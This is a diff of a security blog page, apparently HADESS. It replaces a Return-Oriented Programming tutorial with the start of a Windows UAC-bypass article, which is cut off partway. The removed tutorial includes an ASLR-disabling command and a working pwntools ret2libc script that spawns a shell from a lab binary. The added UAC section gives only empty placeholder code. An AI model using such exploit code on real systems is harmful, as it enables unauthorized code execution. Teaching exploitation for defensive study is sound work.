@@ -124,6 +124,18 @@ img{display:block;max-width:100%}
   .mag-nav-main{padding:14px 20px}
   .post-grid{grid-template-columns:1fr}
 }
+@media(max-width:560px){
+  .mag-cta{display:none}
+}
+/* the magazine's carousels are styled further down the page; while it streams in they would
+   lay out full-width and phones lock the zoom at ~700px. Constrain them from the <head>. */
+.grid-cinematic,.shelf-track{overflow-x:auto;max-width:100%}
+@media(max-width:768px){
+  html,body{overflow-x:hidden}
+  .article-content img,.article-content video,.article-content iframe{max-width:100%;height:auto}
+  .article-content table{display:block;max-width:100%;overflow-x:auto}
+  .article-content pre{max-width:100%;overflow-x:auto}
+}
 @media(max-width:480px){
   .card-img-wrap,.card-img-placeholder{height:180px}
 }
@@ -1222,7 +1234,7 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
     }
 }
 </style>
-<script type="application/ld+json">{"@context":"https://schema.org","@graph":[{"@type":"Article","@id":"https://hadesssecurity.github.io/blog/read/user-account-control-uncontrol-mastering-the-art-of-bypassing-windows-uac#article","headline":"User Account Control/Uncontrol: Mastering the Art of Bypassing Windows UAC — HADESS Magazine","description":"User Account Control (UAC) in Windows is a security feature designed to prevent unauthorized changes made by malware or other threats by requesting...","url":"https://hadesssecurity.github.io/blog/read/user-account-control-uncontrol-mastering-the-art-of-bypassing-windows-uac","mainEntityOfPage":{"@type":"WebPage","@id":"https://hadesssecurity.github.io/blog/read/user-account-control-uncontrol-mastering-the-art-of-bypassing-windows-uac"},"datePublished":"November 15, 2023","author":{"@type":"Organization","name":"hadess"},"publisher":{"@type":"Organization","name":"HADESS","url":"https://hadesssecurity.github.io","logo":{"@type":"ImageObject","url":"https://career.hadess.io/logo-white.png"}},"image":{"@type":"ImageObject","url":"https://hadesssecurity.github.io/wp-content/uploads/2023/11/uac-bypass.png"}}]}</script>
+<script type="application/ld+json">{"@context":"https://schema.org","@graph":[{"@type":"Article","@id":"https://hadesssecurity.github.io/blog/read/user-account-control-uncontrol-mastering-the-art-of-bypassing-windows-uac#article","headline":"User Account Control/Uncontrol: Mastering the Art of Bypassing Windows UAC — HADESS Magazine","description":"User Account Control (UAC) in Windows is a security feature designed to prevent unauthorized changes made by malware or other threats by requesting...","url":"https://hadesssecurity.github.io/blog/read/user-account-control-uncontrol-mastering-the-art-of-bypassing-windows-uac","mainEntityOfPage":{"@type":"WebPage","@id":"https://hadesssecurity.github.io/blog/read/user-account-control-uncontrol-mastering-the-art-of-bypassing-windows-uac"},"datePublished":"November 15, 2023","author":{"@type":"Organization","name":"hadess"},"publisher":{"@type":"Organization","name":"HADESS","url":"https://hadesssecurity.github.io","logo":{"@type":"ImageObject","url":"https://hadesssecurity.github.io/wp-content/uploads/2022/06/Hadess-Cybersecurity.jpg"}},"image":{"@type":"ImageObject","url":"https://hadesssecurity.github.io/wp-content/uploads/2023/11/uac-bypass.png"}}]}</script>
 <!-- Force our dark theme; hide ALL default WP theme output -->
 <style>
 html,body{background:var(--bg)!important;color:var(--text)!important;font-family:var(--font)!important}
@@ -1275,14 +1287,13 @@ body>*:not(#hadess-mag):not(script):not(style):not(link):not(noscript):not(.emai
       <span>Friday, October 2, 2026</span>
     </div>
     <div class="mag-nav-top-right">
-      <a href="mailto:career@hadess.io">Contact</a>
-      <a href="https://career.hadess.io/privacy">Privacy</a>
-      <a href="https://career.hadess.io/terms">Terms</a>
+      <a href="mailto:security@hadess.io">Contact</a>
+      <a href="/products/">Products &amp; Services</a>
       <div class="mag-social">
         <a href="https://www.linkedin.com/company/hadess-security/" target="_blank" rel="noopener noreferrer" aria-label="LinkedIn"><svg fill="currentColor" viewBox="0 0 24 24"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 01-2.063-2.065 2.064 2.064 0 112.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg></a>
         <a href="https://x.com/Hadess_security" target="_blank" rel="noopener noreferrer" aria-label="X"><svg fill="currentColor" viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg></a>
         <a href="https://github.com/hadessCs" target="_blank" rel="noopener noreferrer" aria-label="GitHub"><svg fill="currentColor" viewBox="0 0 24 24"><path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23A11.509 11.509 0 0112 5.803c1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576C20.566 21.797 24 17.3 24 12c0-6.627-5.373-12-12-12z"/></svg></a>
-        <a href="mailto:career@hadess.io" aria-label="Email"><svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 01-2.06 0L2 7"/></svg></a>
+        <a href="mailto:security@hadess.io" aria-label="Email"><svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 01-2.06 0L2 7"/></svg></a>
       </div>
     </div>
   </div>
@@ -1300,16 +1311,16 @@ body>*:not(#hadess-mag):not(script):not(style):not(link):not(noscript):not(.emai
               <a href="/blog?cat=104">Skills &amp; Certifications</a>
               <a href="/blog?cat=76">Career Guide</a>
               <a href="/blog?cat=23">White Paper</a>
-            <a href="https://career.hadess.io/games/">Hack &amp; Learn</a>
+            <a href="/products/">Products &amp; Services</a>
     </div>
     <a href="/blog/search" class="mag-search-btn">
       <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35" stroke-linecap="round"/></svg>
       Search...
       <kbd>/</kbd>
     </a>
-    <a href="https://career.hadess.io/login" class="mag-cta">
+    <a href="/products/#contact" class="mag-cta">
       <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M13 10V3L4 14h7v7l9-11h-7z" stroke-linecap="round" stroke-linejoin="round"/></svg>
-      Launch Career Platform
+      Talk to an Expert
     </a>
     <button class="mag-hamburger" onclick="document.getElementById('mobileMenu').classList.add('open')">
       <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M4 6h16M4 12h16M4 18h16" stroke-linecap="round"/></svg>
@@ -1326,8 +1337,8 @@ body>*:not(#hadess-mag):not(script):not(style):not(link):not(noscript):not(.emai
       <a href="/blog?cat=76">Career Guide</a>
       <a href="/blog?cat=23">White Paper</a>
     <a href="/blog/search">Search</a>
-  <a href="https://career.hadess.io/games/">Hack &amp; Learn</a>
-  <a href="https://career.hadess.io/login" style="color:var(--gold)">Launch Career Platform</a>
+  <a href="/products/">Products &amp; Services</a>
+  <a href="/products/#contact" style="color:var(--gold)">Talk to an Expert</a>
 </div>
 
 <!-- ═══ PAGE-SPECIFIC STYLES ═══ -->
@@ -1539,1464 +1550,1945 @@ body>*:not(#hadess-mag):not(script):not(style):not(link):not(noscript):not(.emai
   <div class="article-content-col">
     <div class="article-content" data-pagefind-body data-pagefind-meta="image:/wp-content/uploads/2023/11/uac-bypass.png">
       
-<p class="wp-block-paragraph">&#8220;ROP Gadget Unleashed&#8221; delves into the intricacies of Return-Oriented Programming (ROP) and its significance in modern exploitation techniques. The article elucidates how attackers leverage existing code snippets, or &#8220;gadgets,&#8221; within a program&#8217;s memory to craft malicious payloads, thus circumventing traditional security mechanisms like Data Execution Prevention (DEP). By chaining these gadgets together, which typically end with a return instruction, adversaries can create a controlled flow of execution that leads to the desired exploit without the need to inject new code. This methodology has emerged as a potent technique for attackers, especially in environments where direct code injection is heavily mitigated.</p>
+<p class="wp-block-paragraph"><strong>User Account Control (UAC)</strong> in Windows is a security feature designed to prevent unauthorized changes made by malware or other threats by requesting administrative privileges. This chapter delves into the intricate design of UAC, aiming to reverse-engineer its workflow to comprehend how it defends against malicious actions. Additionally, we&#8217;ll explore methods used by threat actors to circumvent UAC for privilege escalation.</p>
 
 
 
-<p class="wp-block-paragraph">The article also highlights the importance of identifying and utilizing effective ROP gadgets in penetration testing and exploit development. It discusses various tools and techniques that can be employed to discover ROP gadgets within binary files, emphasizing the necessity of understanding both the architecture and the underlying assembly language of the target application. Furthermore, &#8220;ROP Gadget Unleashed&#8221; underscores the ongoing arms race between security researchers and attackers, showcasing how the development of robust countermeasures against ROP exploits is crucial for maintaining secure systems. By equipping practitioners with knowledge and practical strategies, the article aims to enhance their ability to protect applications against this sophisticated attack vector.</p>
+<p class="wp-block-paragraph">This exploration draws from two notable presentations: &#8220;Duplicate Paths Attack: Get Elevated Privilege from Forged Identities&#8221; at HITCON 2019 and &#8220;Playing Win32 Like a K!NG ;)&#8221; at SITCON 2020. These sessions unveiled a comprehensive reverse engineering of UAC in Windows 10 Enterprise 17763 and discussed privilege escalation techniques applicable to Windows versions 7 through 10, exploiting path normalization.</p>
 
 
 
-<h1 class="wp-block-heading">Overview of Return-Oriented Programming (ROP)</h1>
+<p class="wp-block-paragraph"><strong>UAC Design and Internal Workflow:</strong></p>
 
 
 
-<p class="wp-block-paragraph">Return-Oriented Programming (ROP) is an advanced exploitation technique that allows attackers to execute code in the presence of security measures like stack canaries and non-executable memory. Instead of injecting malicious code, ROP chains together existing code snippets—called &#8220;gadgets&#8221;—found in a program&#8217;s memory. This method emerged in the mid-2000s, notably highlighted by researchers demonstrating its efficacy against defenses like DEP (Data Execution Prevention). As exploits evolved, ROP became a crucial tool for attackers, enabling them to manipulate program control flow without directly executing injected payloads, thus bypassing many traditional security mechanisms.</p>
+<p class="wp-block-paragraph">Overview of UAC:</p>
 
 
 
-<p class="wp-block-paragraph">Return-Oriented Programming (ROP) is a sophisticated exploitation technique used to bypass modern security defenses like Data Execution Prevention (DEP) and Address Space Layout Randomization (ASLR). Instead of injecting malicious code, ROP reuses existing code snippets, called <strong>gadgets</strong>, found within the memory of a vulnerable program. Gadgets are small sequences of instructions that end in a <code>ret</code> instruction, allowing the attacker to chain them together and control program execution.</p>
+<p class="wp-block-paragraph">UAC is a fundamental component of Windows security, presenting prompts for administrative consent or credentials when a program attempts to make changes.</p>
 
 
 
-<h4 class="wp-block-heading">Step-by-Step ROP Attack Example</h4>
+<p class="wp-block-paragraph">It aims to segregate standard user privileges from those of an administrator, reducing the risk of unauthorized system modifications.</p>
 
 
 
-<p class="wp-block-paragraph">Below is a detailed explanation of how to construct a ROP chain in a vulnerable program, along with essential commands and code snippets to help guide you through a basic ROP exploit.</p>
+<p class="wp-block-paragraph">UAC&#8217;s Internal Mechanics:</p>
 
 
 
-<h5 class="wp-block-heading">1. Disable ASLR (for easier exploitation in practice)</h5>
+<p class="wp-block-paragraph">Discuss the architectural design of UAC, including its interaction with system components like the Security Reference Monitor, User Session Control, and other core elements.</p>
 
 
 
-<p class="wp-block-paragraph">In many exploit development scenarios, ASLR (Address Space Layout Randomization) can make exploitation harder. You can disable it temporarily using the following command:</p>
+<p class="wp-block-paragraph">Explain how UAC assesses requests for elevated privileges and the criteria it uses to prompt the user.</p>
 
 
 
-<pre class="wp-block-code"><code>echo 0 | sudo tee /proc/sys/kernel/randomize_va_space</code></pre>
+<p class="wp-block-paragraph"><strong>Reverse Engineering UAC:</strong></p>
 
 
 
-<h5 class="wp-block-heading">2. Find Dependencies and Libraries</h5>
+<p class="wp-block-paragraph">Outline the process of deconstructing UAC&#8217;s functionality, using tools and methods such as system call tracing, monitoring UAC prompts, and analyzing security policies.</p>
 
 
 
-<p class="wp-block-paragraph">Use the <code>ldd</code> command to inspect the shared libraries used by the vulnerable binary. This helps you identify where libc or other shared libraries are located in memory.</p>
+<p class="wp-block-paragraph">Present findings from the reverse engineering process, shedding light on UAC&#8217;s decision-making mechanisms.</p>
 
 
 
-<pre class="wp-block-code"><code>$ ldd vuln-32
-    linux-gate.so.1 (0xf7fd2000)
-    libc.so.6 =&gt; /lib32/libc.so.6 (0xf7dc2000)   # Important: we will use libc later
-    /lib/ld-linux.so.2 (0xf7fd3000)</code></pre>
+<p class="wp-block-paragraph"><strong>Bypass Techniques:</strong></p>
 
 
 
-<h5 class="wp-block-heading">3. Locate Gadgets Using ROPgadget</h5>
+<p class="wp-block-paragraph">Path Normalization Exploit:</p>
 
 
 
-<p class="wp-block-paragraph">The core of any ROP exploit is finding gadgets. These are small chunks of code that perform useful operations (like loading a register or calling a function). For instance, a common gadget is <code>pop rdi; ret</code>, which allows the attacker to set up a function argument before a call to a function like <code>system()</code>.</p>
+<p class="wp-block-paragraph">Detail the path normalization exploit, a technique that manipulates file paths to mislead UAC checks.</p>
 
 
 
-<p class="wp-block-paragraph">Install and use ROPgadget to find usable gadgets in the binary:</p>
+<p class="wp-block-paragraph">Provide a technical breakdown of how this exploit can lead to privilege escalation, along with code examples.</p>
 
 
 
-<pre class="wp-block-code"><code>$ ROPgadget --binary vuln-64 | grep rdi
-0x00000000004011cb : pop rdi ; ret</code></pre>
+<p class="wp-block-paragraph">Case Studies from HITCON and SITCON:</p>
 
 
 
-<p class="wp-block-paragraph">The above command shows that we have found a useful gadget: <code>pop rdi; ret</code> at the address <code>0x4011cb</code>. This gadget will allow us to set up the first argument (RDI register) before calling <code>system()</code>.</p>
+<p class="wp-block-paragraph">Summarize key points from the &#8220;Duplicate Paths Attack&#8221; and &#8220;Playing Win32 Like a K!NG ;)&#8221; presentations, highlighting practical applications of these exploits.</p>
 
 
 
-<h5 class="wp-block-heading">4. Find System and &#8220;/bin/sh&#8221; Strings in libc</h5>
+<p class="wp-block-paragraph">Discuss the implications of these findings on Windows security.</p>
 
 
 
-<p class="wp-block-paragraph">Next, we need to find the address of the <code>system()</code> function and the <code>/bin/sh</code> string in libc, which are critical for executing a shell.</p>
+<p class="wp-block-paragraph">Defensive Strategies:</p>
 
 
 
-<p class="wp-block-paragraph">To find <code>system()</code>:</p>
+<p class="wp-block-paragraph">Emphasize the importance of keeping systems updated to protect against known UAC bypass methods.</p>
 
 
 
-<pre class="wp-block-code"><code>$ readelf -s /lib32/libc.so.6 | grep system
-   1463: 0003cd10   88 FUNC    GLOBAL DEFAULT   13 system</code></pre>
+<p class="wp-block-paragraph">Suggest best practices like restricting file path manipulations, monitoring for unusual system behavior, and employing comprehensive security solutions.</p>
 
 
 
-<p class="wp-block-paragraph">To find the <code>/bin/sh</code> string:</p>
+<h1 class="wp-block-heading" id="h-uac-perspective">UAC Perspective</h1>
 
 
 
-<pre class="wp-block-code"><code>$ strings -a -t x /lib32/libc.so.6 | grep /bin/sh
-   18a143 /bin/sh</code></pre>
+<figure class="wp-block-image"><img fetchpriority="high" decoding="async" width="1260" height="510" src="/wp-content/uploads/2023/11/image-9.png" alt="" class="wp-image-8094" srcset="/wp-content/uploads/2023/11/image-9.png 1260w, /wp-content/uploads/2023/11/image-9-300x121.png 300w, /wp-content/uploads/2023/11/image-9-1024x414.png 1024w, /wp-content/uploads/2023/11/image-9-768x311.png 768w" sizes="(max-width: 1260px) 100vw, 1260px" /></figure>
 
 
 
-<h5 class="wp-block-heading">5. Create the ROP Chain</h5>
+<p class="wp-block-paragraph">The evolution of Microsoft&#8217;s Windows operating system has been marked by continuous efforts to enhance security, particularly in the realm of privilege control. A pivotal development in this journey was the introduction of User Account Control (UAC) in Windows Vista, following the challenges faced by Windows XP in controlling privileges effectively. This article delves into the technical intricacies of UAC, offering a reverse engineering perspective complemented by practical code examples in C++ and PowerShell.</p>
 
 
 
-<p class="wp-block-paragraph">Using the gadgets and addresses we found, we can now build the ROP chain that will exploit the vulnerable program and give us a shell.</p>
+<p class="wp-block-paragraph"><strong>The Genesis of UAC</strong></p>
 
 
 
-<p class="wp-block-paragraph">Here’s the full Python exploit script using <code>pwntools</code>:</p>
+<p class="wp-block-paragraph">In the era of Windows XP, the lack of stringent privilege controls led to a surge in malware activities. Recognizing this vulnerability, Microsoft implemented UAC in subsequent versions, starting with Windows Vista. UAC&#8217;s primary function is to mitigate unauthorized privilege escalation by running programs with lower privileges unless explicitly authorized by the user.</p>
 
 
 
-<pre class="wp-block-code"><code>from pwn import *
+<figure class="wp-block-image"><img decoding="async" width="1000" height="1029" src="/wp-content/uploads/2023/11/image-10.png" alt="" class="wp-image-8095" srcset="/wp-content/uploads/2023/11/image-10.png 1000w, /wp-content/uploads/2023/11/image-10-292x300.png 292w, /wp-content/uploads/2023/11/image-10-995x1024.png 995w, /wp-content/uploads/2023/11/image-10-768x790.png 768w" sizes="(max-width: 1000px) 100vw, 1000px" /></figure>
 
-# Start the vulnerable process
-p = process('./vuln-64')
 
-# Base address of libc (can be found or leaked in real-world scenarios)
-libc_base = 0x7ffff7de5000
-system = libc_base + 0x48e20     # Address of system() in libc
-binsh = libc_base + 0x18a143     # Address of "/bin/sh" string in libc
 
-# ROP gadget addresses
-POP_RDI = 0x4011cb  # Address of pop rdi; ret gadget
+<p class="wp-block-paragraph"><strong>UAC in Action: A Case Study on Windows 10 Enterprise LTSC</strong></p>
 
-# Constructing the payload
-payload = b'A' * 72         # Padding to reach return address
-payload += p64(POP_RDI)     # Gadget to set up the RDI register
-payload += p64(binsh)       # Pointer to the "/bin/sh" string
-payload += p64(system)      # Address of system() to call system("/bin/sh")
-payload += p64(0x0)         # Return address after system() is called (can be arbitrary)
 
-# Send the payload
-p.clean()
-p.sendline(payload)
-p.interactive()</code></pre>
 
+<p class="wp-block-paragraph">Our analysis is based on Windows 10 Enterprise LTSC (10.0.17763 N/A Build 17763). It&#8217;s important to note that Microsoft may update UAC&#8217;s structure, so experiences may vary across different systems and versions.</p>
 
 
-<h4 class="wp-block-heading">Breakdown of the Exploit</h4>
+
+<p class="wp-block-paragraph"><strong>UAC Alert Mechanism</strong></p>
+
+
+
+<p class="wp-block-paragraph">When a user attempts to run a program with elevated privileges, either by right-clicking and selecting &#8220;Run as System Administrator&#8221; or using the PowerShell command Start-Process [path/to/exe] -Verb RunAs, a UAC alert is triggered. This alert displays critical information about the program, aiding the user in making an informed decision.</p>
+
+
+
+<figure class="wp-block-image"><img decoding="async" width="1305" height="562" src="/wp-content/uploads/2023/11/image-20.png" alt="" class="wp-image-8105" srcset="/wp-content/uploads/2023/11/image-20.png 1305w, /wp-content/uploads/2023/11/image-20-300x129.png 300w, /wp-content/uploads/2023/11/image-20-1024x441.png 1024w, /wp-content/uploads/2023/11/image-20-768x331.png 768w" sizes="(max-width: 1305px) 100vw, 1305px" /></figure>
+
+
+
+<p class="wp-block-paragraph"><strong>Locating the UAC Service</strong></p>
+
+
+
+<p class="wp-block-paragraph">The UAC service is embodied in the Application Information service within the Windows Control Panel&#8217;s Services Manager. This service is responsible for activating the high-privilege services.exe service manager using the command C:\Windows\system32\svchost.exe -k netsvcs -p -s Appinfo and hosting the UAC core module appinfo.dll.</p>
+
+
+
+<p class="wp-block-paragraph"><strong>UAC Privilege Service Workflow</strong></p>
+
+
+
+<p class="wp-block-paragraph">When a privilege elevation request is made, for instance, from PowerShell, the UAC privilege service svchost.exe (with AppInfo.dll loaded) responds by launching the UAC authorization GUI consent.exe. This interface presents the user with a decision-making prompt.</p>
+
+
+
+<p class="wp-block-paragraph"><strong>Reverse Engineering Perspective</strong></p>
+
+
+
+<p class="wp-block-paragraph">To understand UAC&#8217;s inner workings, we explore three key questions:</p>
+
+
+
+<p class="wp-block-paragraph">Interaction Between UAC Services: How does the UAC privilege service communicate with the UAC interface program?</p>
+
+
+
+<p class="wp-block-paragraph">Validation of Built-in Services: How does UAC validate certain built-in services to grant privileged states without user authorization?</p>
+
+
+
+<p class="wp-block-paragraph">Exploitation Potential: Are there logical flaws in the validation process that could be exploited maliciously?</p>
+
+
+
+<p class="wp-block-paragraph"><strong>Analyzing UAC Bypass Techniques</strong></p>
+
+
+
+<p class="wp-block-paragraph">By reverse engineering the UAC process, we can uncover potential bypass techniques that have been exploited in real-world attacks. This involves dissecting the callback mechanisms like RAiLaunchAdminProcess and scrutinizing the interaction patterns between different UAC components.</p>
+
+
+
+<p class="wp-block-paragraph">C++ Code Snippet</p>
+
+
+
+<p class="wp-block-paragraph">// C++ example to interact with UAC services (Hypothetical)</p>
+
+
+
+<p class="wp-block-paragraph">#include &lt;windows.h&gt;</p>
+
+
+
+<p class="wp-block-paragraph">int main() {</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;// Code to interact with UAC services</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;// This is a simplified representation and may require additional API calls</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;// for a complete implementation.</p>
+
+
+
+<p class="wp-block-paragraph">}</p>
+
+
+
+<p class="wp-block-paragraph">PowerShell Script</p>
+
+
+
+<p class="wp-block-paragraph"># PowerShell command to run a program with elevated privileges</p>
+
+
+
+<p class="wp-block-paragraph">Start-Process &#8220;path\to\your\program.exe&#8221; -Verb RunAs</p>
+
+
+
+<h1 class="wp-block-heading" id="h-railaunchadminprocess">RAiLaunchAdminProcess</h1>
+
+
+
+<p class="wp-block-paragraph">The User Account Control (UAC) in Windows plays a crucial role in maintaining system security by managing privilege elevation requests. A key component in this architecture is the RAiLaunchAdminProcess callback function, located in appinfo.dll. This article provides a deep technical analysis of this function, exploring its parameters and behavior, and illustrating its operation with C++ and PowerShell code examples.</p>
+
+
+
+<figure class="wp-block-image"><img loading="lazy" decoding="async" width="1304" height="382" src="/wp-content/uploads/2023/11/image-14.png" alt="" class="wp-image-8099" srcset="/wp-content/uploads/2023/11/image-14.png 1304w, /wp-content/uploads/2023/11/image-14-300x88.png 300w, /wp-content/uploads/2023/11/image-14-1024x300.png 1024w, /wp-content/uploads/2023/11/image-14-768x225.png 768w" sizes="(max-width: 1304px) 100vw, 1304px" /></figure>
+
+
+
+<p class="wp-block-paragraph"><strong>The Role of RAiLaunchAdminProcess</strong></p>
+
+
+
+<figure class="wp-block-image"><img loading="lazy" decoding="async" width="1286" height="975" src="/wp-content/uploads/2023/11/image-13.png" alt="" class="wp-image-8098" srcset="/wp-content/uploads/2023/11/image-13.png 1286w, /wp-content/uploads/2023/11/image-13-300x227.png 300w, /wp-content/uploads/2023/11/image-13-1024x776.png 1024w, /wp-content/uploads/2023/11/image-13-768x582.png 768w" sizes="(max-width: 1286px) 100vw, 1286px" /></figure>
+
+
+
+<p class="wp-block-paragraph">When a low-privilege program requests elevation, the UAC privilege service is notified through the RAiLaunchAdminProcess function. This function is responsible for validating the request and, if approved, facilitating the elevation of the requesting program.</p>
+
+
+
+<p class="wp-block-paragraph"><strong>Key Parameters of RAiLaunchAdminProcess</strong></p>
 
 
 
 <ul class="wp-block-list">
-<li><strong>Padding</strong>: We use 72 bytes (<code>'A' * 72</code>) to overflow the buffer and reach the return address.</li>
+<li>RPC_ASYNC_STATE: Manages the state of the asynchronous RPC channel during the privilege request.</li>
 
 
 
-<li><strong>POP_RDI Gadget</strong>: The <code>pop rdi; ret</code> gadget allows us to control the value of the <code>rdi</code> register (the first argument for system()).</li>
+<li>hBinding: Stores the handle of the current RPC channel.</li>
 
 
 
-<li><strong>/bin/sh</strong>: We pass the <code>/bin/sh</code> string as the first argument to <code>system()</code>.</li>
+<li>ExecutablePath: Path of the low-privilege program requesting elevation.</li>
 
 
 
-<li><strong>System Call</strong>: We call <code>system()</code> with <code>/bin/sh</code>, resulting in spawning a shell.</li>
+<li>CommandLine: Command parameters for the execution process.</li>
+
+
+
+<li>CreateFlags: Flags from CreateProcessAsUser request, indicating the nature of the process to be created.</li>
+
+
+
+<li>CurrentDirectory: Working directory for the execution process.</li>
+
+
+
+<li>WindowsStation: Specifies the workstation, typically WinSta0, for user interaction.</li>
+
+
+
+<li>StartupInfo: User requirements for the window display of the execution process.</li>
+
+
+
+<li>ProcessInformation: Structure containing information about the parent and child processes.</li>
 </ul>
 
 
 
-<h5 class="wp-block-heading">6. Running the Exploit</h5>
+<p class="wp-block-paragraph"><strong>RPC Communication and Process Validation</strong></p>
 
 
 
-<p class="wp-block-paragraph">To test the exploit, compile your vulnerable program and run the Python script:</p>
+<figure class="wp-block-image"><img loading="lazy" decoding="async" width="1298" height="485" src="/wp-content/uploads/2023/11/image-18.png" alt="" class="wp-image-8103" srcset="/wp-content/uploads/2023/11/image-18.png 1298w, /wp-content/uploads/2023/11/image-18-300x112.png 300w, /wp-content/uploads/2023/11/image-18-1024x383.png 1024w, /wp-content/uploads/2023/11/image-18-768x287.png 768w" sizes="(max-width: 1298px) 100vw, 1298px" /></figure>
 
 
 
-<figure class="wp-block-table"><table class="has-fixed-layout"><thead><tr><th><strong>Step</strong></th><th><strong>Command</strong></th></tr></thead><tbody><tr><td>Disable ASLR</td><td>`echo 0</td></tr><tr><td>Check shared libraries</td><td><code>ldd vuln-32</code></td></tr><tr><td>Find gadgets</td><td>`ROPgadget &#8211;binary vuln-64</td></tr><tr><td>Find system() in libc</td><td>`readelf -s /lib32/libc.so.6</td></tr><tr><td>Find /bin/sh string</td><td>`strings -a -t x /lib32/libc.so.6</td></tr><tr><td>Compile vulnerable program</td><td><code>gcc -m64 -o vuln-64 vuln-64.c</code></td></tr><tr><td>Exploit using Python script</td><td><code>python3 exploit.py</code></td></tr></tbody></table></figure>
+<p class="wp-block-paragraph">The RAiLaunchAdminProcess function involves a series of RPC communications. It uses I_RpcBindingInqLocalClientPID() to obtain the Process ID of the parent process initiating the RPC request. The function then confirms the parent process&#8217;s status using NtOpenProcess. If the parent process is no longer active, the elevation process is aborted.</p>
 
 
 
-<h4 class="wp-block-heading">Significance of ROP in Modern Exploits</h4>
+<figure class="wp-block-image"><img loading="lazy" decoding="async" width="1315" height="654" src="/wp-content/uploads/2023/11/image-17.png" alt="" class="wp-image-8102" srcset="/wp-content/uploads/2023/11/image-17.png 1315w, /wp-content/uploads/2023/11/image-17-300x149.png 300w, /wp-content/uploads/2023/11/image-17-1024x509.png 1024w, /wp-content/uploads/2023/11/image-17-768x382.png 768w" sizes="(max-width: 1315px) 100vw, 1315px" /></figure>
 
 
 
-<p class="wp-block-paragraph">ROP plays a pivotal role in bypassing contemporary security measures by leveraging existing code to create dynamic execution paths, making it difficult for traditional defenses to detect and mitigate. In an era where many systems implement protections like Address Space Layout Randomization (ASLR) and stack canaries, ROP allows attackers to circumvent these barriers by using the program&#8217;s own code against it. For defenders, understanding ROP is essential to developing effective countermeasures and improving the overall security posture. This ongoing cat-and-mouse game underscores the importance of ROP not only as a tool for attackers but also as a critical area of focus for cybersecurity professionals aiming to protect systems from sophisticated exploits.</p>
+<p class="wp-block-paragraph">Creating exact example code for interacting with the RAiLaunchAdminProcess function in the context of RPC (Remote Procedure Call) communication and process validation is complex and requires a deep understanding of Windows internal APIs and security mechanisms. However, I can provide conceptual C++ and PowerShell examples that illustrate the general idea of how such a process might be initiated and managed.</p>
 
 
 
-<p class="wp-block-paragraph">https://github.com/alanvivona/pwnshop and https://github.com/Rizer0/Ropdump</p>
+<figure class="wp-block-image"><img loading="lazy" decoding="async" width="1282" height="231" src="/wp-content/uploads/2023/11/image-15.png" alt="" class="wp-image-8100" srcset="/wp-content/uploads/2023/11/image-15.png 1282w, /wp-content/uploads/2023/11/image-15-300x54.png 300w, /wp-content/uploads/2023/11/image-15-1024x185.png 1024w, /wp-content/uploads/2023/11/image-15-768x138.png 768w" sizes="(max-width: 1282px) 100vw, 1282px" /></figure>
 
 
 
-<h3 class="wp-block-heading">ROP Gadgets</h3>
+<p class="wp-block-paragraph">This C++ example demonstrates how one might conceptually interact with RPC functions and process validation in Windows.&nbsp;</p>
 
 
 
-<p class="wp-block-paragraph">ROP gadgets are short sequences of instructions that end with a &#8220;return&#8221; instruction, allowing the control flow to jump to the next gadget in a ROP chain. The purpose of these gadgets is to enable an attacker to construct a payload that can manipulate the program&#8217;s execution flow without injecting any new code, effectively utilizing the existing code within a target application or library. This technique is particularly valuable in scenarios where memory protections are in place, as it allows for exploitation without violating these defenses.</p>
+<p class="wp-block-paragraph">#include &lt;windows.h&gt;</p>
 
 
 
-<p class="wp-block-paragraph">Extracting ROP gadgets involves analyzing the binary code of a target application, typically using tools designed for disassembly and reverse engineering. Attackers often employ tools like ROPgadget, Ropper, or custom scripts to scan for sequences of instructions that meet the criteria for gadgets. This process includes identifying potential gadgets by searching through the binary for instructions that lead to a return statement, then cataloging these sequences to facilitate the construction of ROP chains. By carefully selecting and chaining these gadgets, attackers can orchestrate complex exploits tailored to bypass security measures and achieve their objectives.</p>
+<p class="wp-block-paragraph">#include &lt;iostream&gt;</p>
 
 
 
